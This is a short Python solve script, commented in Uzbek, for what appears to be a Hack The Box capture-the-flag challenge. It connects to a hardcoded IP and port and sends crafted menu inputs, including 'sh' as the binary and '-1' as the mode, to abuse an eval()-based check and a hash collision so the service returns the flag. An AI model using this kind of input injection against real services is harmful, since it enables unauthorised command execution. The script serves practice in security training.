import socket
import time

def solve():
    # Yangi IP va Port
    host = '154.57.164.68'
    port = 31363

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    try:
        print(f"[+] {host}:{port} serveriga ulanilmoqda...")
        s.connect((host, port))

        def send_option(choice, data):
            # Menyuni kutish va tanlovni yuborish
            time.sleep(0.5)
            s.sendall(f"{choice}\n".encode())
            time.sleep(0.5)
            # Ma'lumotni yuborish
            s.sendall(f"{data}\n".encode())
            print(f"[+] Tanlov {choice} yuborildi: {data}")

        # 1-qadam: Mode kiritish. 
        # Bizga hash kolliziyasi uchun -1 yoki -2 kerak bo'lishi mumkin.
        # check_operands funksiyasi eval() ishlatadi.
        send_option("1", "-1")

        # 2-qadam: Bin kiritish. 
        # check_stricter_values faqat 4 ta belgi ruxsat beradi (masalan: 'ls', 'sh', '.')
        send_option("2", "sh")

        # 3-qadam: Arguments kiritish (arg1, arg2).
        # check_values 13 ta belgi ruxsat beradi.
        send_option("3", ".,.")

        # 4-qadam: Switches kiritish (switch1, switch2).
        send_option("4", ".,.")

        # 5-qadam: ! Beat the competitor !
        print("[!] Hash collision tekshirilmoqda...")
        time.sleep(0.5)
        s.sendall(b"5\n")

        # Natijani o'qish
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        
        print("\n" + "="*40)
        if "HTB{" in response or "flag" in response.lower():
            print("MUVAFFAQIYAT! FLAG TOPILDI:")
        else:
            print("SERVER JAVOBI:")
        print(response.strip())
        print("="*40)

    except Exception as e:
        print(f"[X] Xatolik: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
